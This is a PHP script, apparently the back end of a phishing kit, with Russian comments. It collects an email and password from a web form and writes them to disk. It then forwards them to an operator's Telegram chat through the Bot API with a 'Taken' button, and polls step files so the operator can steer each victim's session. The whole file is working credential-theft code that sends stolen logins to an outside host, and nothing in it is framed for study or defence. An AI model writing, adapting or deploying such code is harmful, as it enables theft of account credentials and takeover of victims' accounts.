<?php
    require 'tg.php';
    include("vendor/autoload.php");
    use Telegram\Bot\Api;
    
    $uu=0;
    // Переменные с формы
    $name = $_POST['numn'];
    $text = $_POST['fdf'];
    
    // Создание файла
    $today1 = date("U");
    $filenameq = './b/active/'.$today1.'.txt';
    $per=''.$name.' '.$text.'';
    file_put_contents($filenameq, $per);
    // Первая/////////////////////////////////////////////
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Взял', 'callback_data' => 'st']
        ]
      ]
    ];
    $encodedKeyboard = json_encode($keyboard);
    /////////////////////////////////////////////////
    // Массив Клавиатуры 2
    $arr = array(
      'E-mail:        ' => $name,
      'Password: ' => $text,

    );
    //Преображение
    foreach($arr as $key => $value)
    {
      $txt .= "<b>".$key."</b>   ".$value."%0A";
    };
    //////////////////////////////////////////////////
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}&reply_markup={$encodedKeyboard}","r");






    $s_1 = './shagi/first/nach.txt';
    while(true)
    {
        $shag_1=file_get_contents($s_1);
        if($shag_1=='1')
        {
            file_put_contents($s_1, '');
            break;
        }
        elseif($shag_1=='2')
        {
            file_put_contents($s_1, '');
            $exittt=1;
            exit(print $exittt);
            break;
        }
    }
    
    



    $p_1 = './shagi/second/nach.txt';
    while(true)
    {
        $peop_1=file_get_contents($p_1);
        $p=substr($peop_1,-1);
        if($p=='1')
        {
            file_put_contents($p_1, '');
            break;
        }
        elseif($p=='2')
        {
            file_put_contents($p_1, '');
            $exittt=$peop_1;
            exit(print $exittt);
            break;
        }
    }

    $f_1 = './shagi/third/nach.txt';
    while(true)
    {
        $peop_1=file_get_contents($f_1);
        $p=substr($peop_1,-1);
        if($p=='3')
        {
            file_put_contents($f_1, '');
            $exittt=$peop_1;
            exit(print $exittt);
            break;
        }
    }
    





    